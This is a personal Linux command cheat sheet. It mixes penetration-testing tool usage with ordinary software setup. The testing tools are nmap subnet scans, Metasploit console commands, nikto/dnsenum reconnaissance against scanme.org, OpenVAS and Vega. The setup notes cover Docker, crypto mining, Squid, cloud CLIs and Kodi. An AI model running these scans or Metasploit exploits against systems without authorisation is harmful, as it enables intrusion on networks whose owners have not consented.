#Create fake web pages
/var/www/html/fakepage.html

#Start the Apache web server
sudo apache2ctl start



#--------------------------------------------------------------------------------------------------------------------------------
#Using nmap to scan network

#Save ping scan results to plain text file
sudo nmap -oN pingscan.lst -v 192.168.0.*

#From text list of target hosts, save full port scan results to XML file
sudo nmap -p- -A -iL pingscan.lst -oX scanresults.xml 192.168.0.*

#Traceroute
sudo nmap --traceroute 192.168.0.*

#Operating system discovery and service versions
sudo nmap -O -sV 192.168.0.*



#--------------------------------------------------------------------------------------------------------------------------------
#Wireshark on Ubuntu

#1. Install Wireshark
sudo apt-get install wireshark

#2. Create a wireshark group
sudo groupadd wireshark

#3. Add your username to the wireshark group
sudo usermod -a -G wireshark YOUR_USERNAME

#4. Change the group ownership of the file dumpcap to wireshark
sudo chgrp wireshark /usr/bin/dumpcap

#5. Chage the mode of the file dumpcap to allow execution by the group wireshark
sudo chmod 750 /usr/bin/dumpcap

#6. Grant capabilities with setcap
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap

#7. Verify the change
sudo getcap /usr/bin/dumpcap

#8. Reboot



#--------------------------------------------------------------------------------------------------------------------------------
#Installing Metasploit

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo ./msfinstall
  
  
sudo service postgresql start
sudo msfconsole
clear
?
show exploits
search windows
search cve:2010 type:exploit app:client
search win10
search win7
info exploit
use exploit 
show options
set setting value
back
whois target
host FQDN
nmap -F 



curl https://github.com/WebGoat/WebGoat/releases/download/7.1/webgoat-container-7.1-exec.jar > ./webgoat-container-7.1-exec.jar
java -jar ./webgoat-container-7.1-exec.jar -httpPort=8081
http://localhost:8081/WebGoat

dmitry -pb scanme.org
dnsenum scanme.org
nikto -h scanme.org



#--------------------------------------------------------------------------------------------------------------------------------
# Using Kali OpenVAS

sudo apt-get install -y openvas
openvas-setup
#openvasmd --user=admin --new-password=admin
openvas-nvt-sync
openvas-start
firefox https://127.0.0.1:9392



#--------------------------------------------------------------------------------------------------------------------------------
# Using Kali Vega

sudo apt-get install -y vega
vega
proxy: 127.0.0.1:8888



#--------------------------------------------------------------------------------------------------------------------------------
#Using MiniNet

sudo apt-get install kvm libvirt-bin virtinst

#Remove the default libvirt bridge (named virbr0). This ensures that the bridge compatibility portion of OVS can load without any potential conflicts:
sudo virsh net-destroy default
sudo virsh net-autostart --disable default

#aptitude purge ebtables

#MiniNet help
mn -h

#Create various topologies
sudo mn --topo=single,4

sudo mn --topo=linear,2,3

sudo mn --topo=tree,2,2

#Shutdown and cleanup MiniNet
sudo mn -c

#Install Open vSwitch
sudo apt-get install openvswitch-controller openvswitch-brcompat openvswitch-switch openvswitch-datapath-source

#Enable bridge compatibility mode for OVS
sudo nano /etc/default/openvswitch-switch and change this line:

#Find
# #BRCOMPAT=no
#Change it by removing the hash mark (uncommenting it) and specifying yes:
# BRCOMPAT=yes

#Start Open vSwitch
sudo service openvswitch-switch start

#Build and install the necessary module if needed
sudo module-assistant auto-install openvswitch-datapath

#To check KVM, use this command to return a list of running VMs
sudo virsh -c qemu:///system list

#To check Open vSwitch, first use this command to see if the kernel modules loaded properly:
sudo lsmod | grep brcom
#This should return an entry containing brcompat_mod and openvswitch_mod

#To show the running state of Open vSwitch processes
sudo service openvswitch-switch status

sudo ovs-vsctl show 

#create a bridge and add at least one physical interface to allow external communication
ovs-vsctl add-br br0
ovs-vsctl add-port br0 eth0



#--------------------------------------------------------------------------------------------------------------------------------
#Configuring MAME
mame
cd ~/.mame && mame -cc

#The "mame.ini" file will be created in the ~/.mame folder. Edit now this file with this command:

nano ~/.mame/mame.ini

#In "rompath", you can set your own ROM directory path or leave default paths:
#Next, create the following directories in the ~/.mame folder:

mkdir  ~/.mame/nvram memcard roms inp comments sta snap diff

gnome-video-arcade -b



#--------------------------------------------------------------------------------------------------------------------------------
# OpenSSL

openssl req -new -newkey rsa:4096





#--------------------------------------------------------------------------------------------------------------------------------
# CPU mining

git clone https://github.com/tpruvot/cpuminer-multi

cd cpuminer-multi/

./build.sh -j4

./cpuminer -a x16r -o stratum+tcp://pool.threeeyed.info:3333 -u RFGsQiFaySVMjcvKTDxsWu5ftFVpbRsuG3 -p c=RVN -t 2


#--------------------------------------------------------------------------------------------------------------------------------
# GPU mining

sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl libssl-dev libgmp-dev make g++ git libgmp-dev opencl-headers libncurses5-dev libtool ocl-icd-opencl-dev

git clone https://github.com/novaspirit/sgminer

cd sgminer 

git submodule init

git submodule update

autoreconf -i

CFLAG="-O2 -march=native" ./configure --disable-adl

make -j4

#ASIC
git clone https://github.com/ckolivas/cgminer

#GPU
git clone https://github.com/ckolivas/cgminer/tree/3.7

CFLAGS="-O2 -Wall -march=native" ./configure --enable-opencl --enable-scrypt



#--------------------------------------------------------------------------------------------------------------------------------

wordpress

#--------------------------------------------------------------------------------------------------------------------------------

joomla

#--------------------------------------------------------------------------------------------------------------------------------

drupal

#--------------------------------------------------------------------------------------------------------------------------------

snort

#--------------------------------------------------------------------------------------------------------------------------------

surricatta

#--------------------------------------------------------------------------------------------------------------------------------

AlienVault

#--------------------------------------------------------------------------------------------------------------------------------

RazorBack

#--------------------------------------------------------------------------------------------------------------------------------
# CUPS print server

sudo apt-get install cups
sudo usermod -a -G lpadmin pi
sudo cupsctl --remote-any
sudo /etc/init.d/cups restart

sudo apt-get install samba
sudo nano /etc/samba/smb.conf
[printers]
guest ok = yes
[print$]
read only = no

sudo systemctl restart smbd

http://localhost:631/admin

#--------------------------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------

#--------------------------------------------------------------------------------------------------------------------------------
#Create Squid Proxy Server
#These instructions are specific for Ubuntu.

#Install Squid
sudo apt-get install squid3
sudo cp /etc/squid3/squid.conf /etc/squid3/squid.conf.ORIG
sudo chmod a-w /etc/squid3/squid.conf.ORIG
sudo vi /etc/squid3/squid.conf

#By default, Squid listens on port 3128.  If you want to change the port change the http_port directive.

#To allow only a specific range of IPs to connect, edit the ACL section.  For this example, we want to allow the 192.168.42.0 subnetwork access to squid.

#At the bottom of the ACL section, add the line (without the quotes): "acl fortytwo_network src 192.168.42.0/24".

#Add the top of the http_access section, add the line (without the quotes): "http_access allow fortytwo_network"

sudo service squid3 restart
tail -f syslog
#Setup Basic Authentication
#ID	Status	Task

#Setup Digest Authentication
cd /etc/squid3/
sudo touch passwd
apt-get install apache2-utils
sudo chown proxy.proxy passwd
chmod 640 passwd
sudo chmod 640 passwd
sudo htdigest /etc/squid3/passwd <realm name> <username>
sudo cat passwd
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd "OnlyMe":"OverThere"
/usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd "<username>":"<realm name>"
sudo /usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
sudo vi /etc/squid3/squid.conf
sudo service squid3 reload

#In the auth_param section, add the following lines:

auth_param digest program /usr/lib/squid3/digest_file_auth -c /etc/squid3/passwd
auth_param digest realm <realm name>
auth_param digest children 2

#In the http_access section, add the following line at the top:

http_access allow auth_users

#In the ACL section, add the following line right before network acle (forttwo_network in the example above):

acl auth_users proxy_auth REQUIRED

#Note: PuTTY only allows the use of Basic authentication when using the proxy setting.  You could consider doing SSH PortForwarding as an alternative.



#--------------------------------------------------------------------------------------------------------------------------------
# Starting Amazon Alexa Echo
# https://developer.amazon.com/avs/home.html#/

# To run the demo, do the following in 3 seperate terminals:

# Run the companion service:
cd /home/pi/alexa-avs-sample-app/samples/companionService && npm start

# Run the AVS Java Client: 
cd /home/pi/alexa-avs-sample-app/samples/javaclient && mvn exec:exec

# Run the wake word agent:
  # Sensory: 
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && ./wakeWordAgent -e sensory
  # KITT_AI: 
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && ./wakeWordAgent -e kitt_ai

  # GPIO: PLEASE NOTE -- If using this option, run the wake word agent as sudo:
  cd /home/pi/alexa-avs-sample-app/samples/wakeWordAgent/src && sudo ./wakeWordAgent -e gpio

#--------------------------------------------------------------------------------------------------------------------------------
# Starting Google Gina Assistant
# https://console.cloud.google.com/cloud-resource-manager

sudo apt-get install python3-dev python3-venv portaudio19-dev libffi-dev libssl-dev

python3 -m venv env

env/bin/python -m pip install pip setuptools

source env/bin/activate

#Downloading libs for google assistant

python -m pip install https://github.com/googlesamples/assistant-sdk-python/releases/download/0.3.1/google_assistant_library-0.0.2-py2.py3-none-linux_armv7l.whl

#oauth tool

python -m pip install google-auth-oauthlib[tool]

#obtaining oauth key. replace idxxx with your client id file

google-oauthlib-tool –client-secrets /home/pi/client_secret_729061024252-itm9ccvgaqleobll1uc1b1oqeikhroi9.apps.googleusercontent.com.json --scope https://www.googleapis.com/auth/assistant-sdk-prototype –-save –-headless

#to run google assistant

google-assistant-demo



# older method
python -m googlesamples.assistant.auth helpers --client-secrets /home/pi/client_secret_501300937746-ol46e5jaiaredjp2np32ekrav97c3pfk.apps.googleusercontent.com.json

# https://myaccount.google.com/activitycontrols

python -m googlesamples.assistant

#--------------------------------------------------------------------------------------------------------------------------------
# Installing Docker

# Docker for Raspberry Pi
curl -sSL https://get.docker.com | sh
sudo usermod -aG docker pi

# Docker for Linux
sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual
sudo apt-get install docker-ce

# https://docs.docker.com/engine/installation/linux/ubuntu/#install-using-the-repository

# Install packages to allow apt to use a repository over HTTPS:
sudo apt-get install apt-transport-https ca-certificates curl software-properties-common

# Add Docker’s official GPG key:
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -

# Verify that the key fingerprint is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.
sudo apt-key fingerprint 0EBFCD88

# Verify that the key fingerprint is DD91 1E99 5A64 A202 E859 07D6 BC14 F10B 6D08 5F96.
apt-key fingerprint 0EBFCD88

# Use the following command to set up the stable repository.
# Note: The lsb_release -cs sub-command below returns the name of your Ubuntu distribution, such as xenial.

# Sometimes, in a distribution like Linux Mint, you might have to change $(lsb_release -cs) to your parent Ubuntu distribution. For example: If you are using Linux Mint Rafaela, you could use trusty.

#To add the edge repository, add edge after stable on the last line of the command. For information about stable and edge builds, see Docker variants.

sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
# or
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }') stable"
sudo apt-get update

# Install the latest version of Docker, or go to the next step to install a specific version. Any existing installation of Docker is replaced.

# Use this command to install the latest version of Docker:
sudo apt-get install docker-ce

# Warning: If you have multiple Docker repositories enabled, installing or updating without specifying a version in the apt-get install or apt-get update command will always install the highest possible version, which may not be appropriate for your stability needs.

# The contents of the list depend upon which repositories are enabled, and will be specific to your version of Ubuntu (indicated by the xenial suffix on the version, in this example). Choose a specific version to install. The second column is the version string. The third column is the repository name, which indicates which repository the package is from and by extension its stability level. To install a specific version, append the version string to the package name and separate them by an equals sign (=):

# The Docker daemon starts automatically.

# Verify that Docker CE or Docker EE is installed correctly by running images
docker-machine env
eval $("C:\Program Files\Docker Toolbox\docker-machine.exe" env)


sudo docker run -ti --name hello-world hello-world:latest
sudo docker run -ti --name swarm swarm:latest
sudo docker run -ti --name registry registry:latest
sudo docker run -ti --name alpine alpine:latest sh
sudo docker run -ti --name busybox busybox:latest sh
sudo docker run -ti -v /var/run/docker.sock:/var/run/docker.sock --name docker docker:latest sh

sudo docker run -ti --name debian debian:latest bash
sudo docker run -ti --name ubuntu ubuntu:latest bash
sudo docker run -ti --name fedora fedora:latest bash
sudo docker run -ti --name centos centos:latest bash
#sudo docker run -ti --name opensuse opensuse:latest bash
sudo docker run -ti --name mageia mageia:latest bash
sudo docker run -ti --name amazon amazonlinux:latest bash
sudo docker run -ti --name oracle oraclelinux:latest bash
sudo docker run -ti --name jenkins jenkins:latest bash

sudo docker run -ti --name gcc gcc:latest bash
sudo docker run -ti --name golang golang:latest bash
sudo docker run -ti --name python3 python:latest
sudo docker run -ti --name r-base r-base:latest
sudo docker run -ti --name haskell haskell:latest
sudo docker run -ti --name julia julia:latest

sudo docker pull tensorflow/tensorflow                  # Download latest image
sudo docker run -it -p 8888:8888 tensorflow/tensorflow  # Start a Jupyter notebook server 
 
sudo docker run -ti --name azuresdk azuresdk/azure-cli-python:latest
sudo docker run -ti --name gcloudsdk google/cloud-sdk:latest
sudo docker run -ti --name gcloudsdk google/cloud-sdk gcloud init
sudo docker run --rm -ti google/cloud-sdk gcloud info
sudo docker run --rm -ti google/cloud-sdk gcloud components list
sudo docker run --rm -ti google/cloud-sdk gcutil listinstances
sudo docker run --rm -ti google/cloud-sdk gsutil ls


docker pull hashicorp/waypoint:latest


sudo docker run -ti --name nanoserver microsoft/nanoserver:latest
sudo docker run -ti --name coreserver microsoft/windowsservercore:latest
sudo docker run -ti --name powershell microsoft/powershell:latest
sudo docker run -d --name nanoiis -d -it -p 80:80 nanoserver/iis

sudo docker run -d --name redis -p 127.0.0.1:6379:6379 -v "$PWD/data":/data redis:latest
sudo docker run -d --name mysql mysql:latest
sudo docker run -d -p 80:80 --name nginx nginx:latest; curl localhost:80
sudo docker run -d -p 8080:8080 --name webgoat webgoat/webgoat-7.1:latest; curl localhost:8080; lynx http://192.168.99.100:8080/WebGoat/
sudo docker run -d -p 1880:1880 --name nodered nodered/node-red-docker

docker run -d -p 4444:4444 -v /dev/shm:/dev/shm -e GRID_TIMEOUT=30000 -e GRID_MAX_SESSION=5 --name selenium-hub selenium/hub:3.4.0-dysprosium
docker run -d -e NODE_MAX_INSTANCES=5 -e NODE_MAX_SESSION=5 -v /dev/shm:/dev/shm --link selenium-hub:hub selenium/node-chrome:3.4.0-dysprosium
docker-compose scale chrome=15 firefox=15 docker-compose.yml

hub:
	image:selenium/hub
	ports:
		-”4444:4444”
firefox:
	image:selenium/node-firefox
	links:
		-hub
chrome:
	image:selenium/node-chrome
	links:
		-hub


sudo docker commit image-id new-image-name

docker ps -a
docker stop name
docker rm name
docker rmi name



# This command downloads a test image and runs it in a container. When the container runs, it prints an informational message and exits.

# Docker is installed and running. You need to use sudo to run Docker commands. Continue to Linux postinstall to allow non-privileged users to run Docker commands and for other optional configuration steps.


UPGRADE DOCKER

To upgrade Docker, first run sudo apt-get update, then follow the installation instructions, choosing the new version you want to install.
Install from a package

If you cannot use Docker’s repository to install Docker, you can download the .deb file for your release and install it manually. You will need to download a new file each time you want to upgrade Docker.
This step is different for Docker CE and Docker EE.
Docker CE: Go to https://download.docker.com/linux/ubuntu/pool/stable-17.03/amd64/ and download the .deb file for the Docker version you want to install and for your version of Ubuntu.
Note: To install an edge package, change the word stable in the > URL to edge. For information about stable and edge builds, see Docker variants.
Docker EE: Go to the Docker EE repository URL associated with your trial or subscription in your browser. Go to x86_64/stable and download the .rpm file for the Docker version you want to install.
Install Docker, changing the path below to the path where you downloaded the Docker package.
$ sudo dpkg -i /path/to/package.deb
The Docker daemon starts automatically.
Verify that Docker CE or Docker EE is installed correctly by running the hello-world image.
$ sudo docker run hello-world
This command downloads a test image and runs it in a container. When the container runs, it prints an informational message and exits.
Docker is installed and running. You need to use sudo to run Docker commands. Continue to Post-installation steps for Linux to allow non-privileged users to run Docker commands and for other optional configuration steps.
UPGRADE DOCKER

To upgrade Docker, download the newer package file and repeat the installation procedure, pointing to the new file.
Uninstall Docker
Uninstall the Docker package:
Docker Edition	Command
Docker CE	sudo apt-get purge docker-ce
Docker EE	sudo apt-get purge docker-ee
Images, containers, volumes, or customized configuration files on your host are not automatically removed. To delete all images, containers, and volumes:
$ sudo rm -rf /var/lib/docker
You must delete any edited configuration files manually.

#--------------------------------------------------------------------------------------------------------------------------------
# Installing Vagrant

wget https://releases.hashicorp.com/vagrant/2.0.0/vagrant_2.0.0_x86_64.deb -O vagrant_2.0.0_x86_64.deb &&  sudo dpkg -i vagrant_2.0.0_x86_64.deb

vagrant plugin repair





#--------------------------------------------------------------------------------------------------------------------------------
# Open Management Infrastructure - PowerShell - DSC for Linux

wget https://github.com/Microsoft/omi/releases/download/v1.1.0-0/omi-1.1.0.ssl_100.x64.deb
sudo dpkg -i omi-1.1.0.ssl_100.x64.deb

wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-alpha.17/powershell_6.0.0-alpha.17-1ubuntu1.16.04.1_amd64.deb
sudo dpkg -i powershell_6.0.0-alpha.17-1ubuntu1.16.04.1_amd64.deb

# Windows PowerShell Desired State Configuration for Linux source
wget https://github.com/Microsoft/PowerShell-DSC-for-Linux/releases/download/v1.1.1-294/dsc-1.1.1-294.ssl_100.x64.deb
sudo dpkg -i dsc-1.1.1-294.ssl_100.x64.deb

sudo add-apt-repository  "deb http://archive.ubuntu.com/ubuntu/ xenial-proposed restricted main multiverse universe"

sudo apt-get install git pkg-config make g++ rpm librpm-dev libpam0g-dev libssl-dev libkrb5-dev libgssapi-krb5-2 gss-ntlmssp

git clone --recursive git@github.com:Microsoft/ostc-openssl.git

cd openssl-1.0.0

#To configure and build SSL 1.0.0, use the following commands:

./config --prefix=/usr/local_ssl_1.0.0 shared -no-ssl2 -no-ec -no-ec2m -no-ecdh
make depend
make
make test
sudo make install_sw

OMI_USER=omi_test
OMI_PASSWORD=`xxxxx
`
export OMI_USER
export OMI_PASSWORD

git clone --recursive git@github.com:Microsoft/Build-omi.git bld-omi

cd bld-omi
git checkout master
git submodule foreach git checkout master

cd bld-omi
pushd bld-omi/omi/Unix
./configure --dev
make -j
popd

# Run regression tests

pushd bld-omi/omi/Unix
./regress
popd
Building Release Agents

# From the bld-omi directory (created above from 'git clone', do the following:

cd omi/Unix
./configure
make

./configure --enable-ulinux

./configure --enable-microsoft



#--------------------------------------------------------------------------------------------------------------------------------
# Configuring Google Cloud Platform

# Create an environment variable for the correct distribution:
export CLOUD_SDK_REPO="cloud-sdk-$(grep "UBUNTU_CODENAME" /etc/os-release | awk -F '=' '{ print $2 }')"

# Add the Cloud SDK distribution URI as a package source:
echo "deb https://packages.cloud.google.com/apt $CLOUD_SDK_REPO main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list

# Import the Google Cloud public key:
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -

# Update and install the Cloud SDK:
sudo apt-get update && sudo apt-get install google-cloud-sdk google-cloud-sdk-app-engine-python google-cloud-sdk-app-engine-java google-cloud-sdk-datalab google-cloud-sdk-datastore-emulator google-cloud-sdk-pubsub-emulator google-cloud-sdk-bigtable-emulator kubectl

# Run gcloud init to get started:
gcloud init

pip3 install datalab gcloud 

gcloud components install kubectl




#--------------------------------------------------------------------------------------------------------------------------------
# Configuring Amazon Web Services

aws configure

aws ec2 describe-instances --region eu-north-1

aws ec2 run-instances --image-id region image id --instance-type t2.micro --region eu-north-1

aws --region eu-north-1 cloudformation validate-template --template-body file://./template.yml

aws --region eu-north-1 cloudformation create-stack --stack-name ec2stack --parameters file://./template.json --template-body file://./template.yml

aws --region eu-north-1 cloudformation update-stack --stack-name ec2stack --parameters file://./template.json --template-body file://./template.yml





#--------------------------------------------------------------------------------------------------------------------------------
# PowerShell 7.0 on Linux

# Import the public repository GPG keys
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -

# Register the Microsoft Ubuntu repository
curl https://packages.microsoft.com/config/ubuntu/16.04/prod.list | sudo tee /etc/apt/sources.list.d/microsoft.list

# Update apt-get
sudo apt-get update

# Install PowerShell
sudo apt-get install -y powershell

# Start PowerShell
powershell
pwsh



#--------------------------------------------------------------------------------------------------------------------------------
# Microsoft Azure CLI
# https://docs.microsoft.com/en-gb/cli/azure/install-azure-cli

sudo apt-get update && sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential nodejs npm
sudo npm install -g azure-cli

# 32-bit system
echo "deb https://packages.microsoft.com/repos/azure-cli/ jessie main" | \
     sudo tee /etc/apt/sources.list.d/azure-cli.list

# 64-bit system
echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ wheezy main" | sudo tee /etc/apt/sources.list.d/azure-cli.list

sudo apt-key adv --keyserver packages.microsoft.com --recv-keys 417A0893
sudo apt-get install apt-transport-https
sudo apt-get update && sudo apt-get install nodejs npm azure-cli


#--------------------------------------------------------------------------------------------------------------------------------
# Kodi

If you are not up to date use this FIRST

 sudo apt-get update
 
 sudo apt-get upgrade

1. echo 'deb http://pipplware.pplware.pt/pipplware/dists/jessie/main/binary /' | sudo tee --append /etc/apt/sources.list.d/pipplware_jessie.list

2. wget -O - http://pipplware.pplware.pt/pipplware/key.asc | sudo apt-key add -

3. sudo apt-get update

4. sudo apt-get install kodi


 optional update Kodi to latest version provided by the repo

   sudo apt-get upgrade
   sudo apt-get dist-upgrade




To get and install kodi 15.1 for Raspbian, run the following from a terminal or the command line:

wget http://steinerdatenbank.de/software/kodi-15.tar.gz
tar -xzf kodi-15.tar.gz
cd kodi-15
sudo ./install





To get and install kodi 15.2RC3 for Jessie, run the following from a terminal or the command line:

wget http://steinerdatenbank.de/software/kodi-15-jessie.tar.gz
tar -xzf kodi-15-jessie.tar.gz
cd kodi-15-jessie
sudo ./install



#--------------------------------------------------------------------------------------------------------------------------------
# Netflix Hulu

 sudo apt-get update
 
 sudo apt-get upgrade

 wget https://github.com/kusti8/chromium-build/releases/download/netflix-1.0.0/chromium-browser_56.0.2924.84-0ubuntu0.14.04.1.1011.deb

 sudo dpkg -i chromium-browser_56.0.2924.84-0ubuntu0.14.04.1.1011.deb
 
#--------------------------------------------------------------------------------------------------------------------------------
# Install OpenStack

apt install software-properties-common
add-apt-repository cloud-archive:newton
apt install python-openstackclient


#--------------------------------------------------------------------------------------------------------------------------------
# Robot Operating System   https://wiki.ros.org/ROS/Tutorials

sudo sh -c 'echo "deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main" > /etc/apt/sources.list.d/ros-latest.list'
sudo apt-key adv --keyserver 'hkp://keyserver.ubuntu.com:80' --recv-key C1CF6E31E6BADE8868B172B4F42ED6FBAB17C654
sudo apt update
sudo apt install ros-melodic-desktop-full

apt search ros-melodic

echo "source /opt/ros/melodic/setup.bash" >> ~/.bashrc
source ~/.bashrc

sudo rosdep init
rosdep update

sudo apt install python-rosinstall python-rosinstall-generator python-wstool build-essential



#--------------------------------------------------------------------------------------------------------------------------------

wget -q "http://packages.medibuntu.org/medibuntu-key.gpg" -O- | sudo apt-key add -
sudo add-apt-repository "deb http://packages.medibuntu.org/ $(lsb_release -sc) free non-free"
sudo apt-get update && sudo apt-get install w32codecs w64codecs libdvdcss2

#--------------------------------------------------------------------------------------------------------------------------------
# Brave browser

sudo apt install apt-transport-https curl

curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | sudo apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -

echo "deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main" | sudo tee /etc/apt/sources.list.d/brave-browser-release.list

sudo apt update

sudo apt install brave-browser

